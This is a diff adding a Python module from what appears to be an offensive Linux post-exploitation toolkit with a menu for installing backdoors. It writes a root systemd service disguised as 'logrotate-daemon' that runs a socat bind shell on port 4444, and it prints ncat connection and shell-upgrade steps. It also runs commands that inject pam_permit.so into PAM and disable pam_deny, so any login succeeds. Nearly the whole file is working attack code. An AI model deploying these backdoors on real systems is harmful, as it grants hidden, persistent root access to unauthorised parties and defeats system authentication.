@@ -1,0 +1,174 @@
+import time
+import subprocess as sub
+from typing import Union
+from rich.text import Text
+from Utils.custom_input import user_input, confirm_input
+from Utils.get_local_ip import get_ip
+import Utils.output_handler as oh
+
+def config(attaque_type: str) -> Union[dict, list, bool]:
+    try:
+        ip = get_ip()
+    except Exception:
+        return False
+
+    backdoor_config = {
+        "service": {
+            "path": "/etc/systemd/system/logrotate-daemon.service",
+            "run_backdoor": (
+                "systemctl enable --now logrotate-daemon.service 2>/dev/null && "
+                "systemctl start logrotate-daemon.service 2>/dev/null"
+            ),
+            "dependancy": [
+                "sudo apt update && sudo apt install socat -y"
+            ],
+            "config": """[Unit]
+Description=Log rotation Daemon
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
+Restart=always
+RestartSec=5
+User=root
+NoNewPrivileges=true
+
+[Install]
+WantedBy=multi-user.target
+""",
+            "rules": [
+                f"ncat {ip} 4444",
+                "export TERM=xterm",
+                "export SHELL=bash",
+                "script /dev/null -c /bin/bash",
+                "Then press Ctrl+Z",
+                "stty raw -echo",
+                "fg",
+                "Then press Enter"
+            ],
+        },
+        "pam": [
+            "echo 'auth sufficient pam_permit.so' >> /etc/pam.d/common-auth",
+            "sed -i 's/^auth[[:space:]]\\+requisite[[:space:]]\\+pam_deny.so/#&/' /etc/pam.d/common-auth",
+        ],
+    }
+
+    return backdoor_config.get(attaque_type, False)
+
+
+def run_command(cmd: str) -> None:
+    try:
+        sub.run(cmd, text=True, shell=True)
+    except Exception:
+        pass
+
+
+def backdoor(type: str) -> None:
+    get_config = config(type)
+    oh.output_handler(is_error=not bool(get_config),message="Can't perform your request")
+
+    if type.lower() != "pam":
+        config_content = get_config["config"]
+        path = get_config["path"]
+        dependancy = get_config["dependancy"]
+
+        try:
+            with open(path, "w") as f:
+                f.write(config_content)
+        except Exception as e:
+            oh.output_handler(is_error=True, message="Failed to write service file: ",error_detail=e)
+
+        oh.output_handler(
+            with_panel=True,
+            message=Text.from_markup(
+                f"[bold green][+][/bold green] Service created at: [blue]{path}[/blue]\n"
+                f"[bold yellow]Run the following commands as [bold]root[/bold]:[/bold yellow]\n"
+                f"[dim]{chr(10).join(dependancy)}[/dim]\n\n"
+                f"[dim]{get_config['run_backdoor']}[/dim]\n\n"
+                f"[bold yellow]Then connect from your local machine using:[/bold yellow]"
+            ),
+            title="Service Backdoor Info",
+            border_style="green",
+        )
+
+        for rule in get_config["rules"]:
+            oh.output_handler(message=f"[dim]{rule}[/dim]")
+
+    else:
+        for cmd in get_config:
+            oh.output_handler(
+                message=f"[bold green][+][/bold green] Running: [dim]{cmd}[/dim]"
+            )
+            time.sleep(1)
+            run_command(cmd)
+
+        oh.output_handler(
+            message="[bold green][+] PAM backdoor configuration complete.[/bold green]"
+        )
+
+def backdoor_choice():
+    menu = Text()
+    menu.append("┌──[ ", style="bold green")
+    menu.append("Backdoor Options", style="bold white")
+    menu.append(" ]\n│\n", style="bold green")
+    menu.append("│ [1] ", style="bold yellow")
+    menu.append("PAM Backdoor\n", style="white")
+    menu.append("│ [2] ", style="bold yellow")
+    menu.append("Service Backdoor\n", style="white")
+    menu.append("└───────────────\n", style="bold green")
+
+    oh.output_handler(message=menu)
+
+    choice = user_input(
+        choices=["1", "2"],
+        label="[?] Select an option (1-2)",
+        default="1",
+    )
+
+    handle_choice(choice)
+
+
+def handle_choice(value: str) -> None:
+    descriptions = {
+        "pam": {
+            "title": "PAM Backdoor",
+            "description": (
+                "Modifies PAM configuration to allow any login attempt by injecting pam_permit.so.\n"
+                "This effectively bypasses standard authentication mechanisms."
+            ),
+        },
+        "service": {
+            "title": "Service Backdoor",
+            "description": (
+                "Creates a persistent systemd service that starts a reverse shell listener using socat.\n"
+                "Can be used to gain root shell remotely."
+            ),
+        },
+    }
+
+    backdoor_type = "pam" if value == "1" else "service"
+    desc = descriptions.get(backdoor_type)
+
+    summary_text = Text.from_markup(f"""
+[bold cyan]Type:[/bold cyan] {desc['title']}
+[bold cyan]Goal:[/bold cyan] {desc["description"]}
+""")
+
+    oh.output_handler(
+        with_panel=True,
+        message=summary_text,
+        title="Backdoor Summary",
+        border_style="cyan",
+    )
+
+    confirm = confirm_input(
+        label=f"[?] Do you want to continue with {desc['title']}?"
+    )
+
+    if confirm:
+        try:
+            backdoor(backdoor_type)
+        except Exception:
+            oh.output_handler(is_error=True, message="Can't perform your request")
+    else:
+        oh.output_handler(message="[bold yellow][~] Cancelled by user.[/bold yellow]")
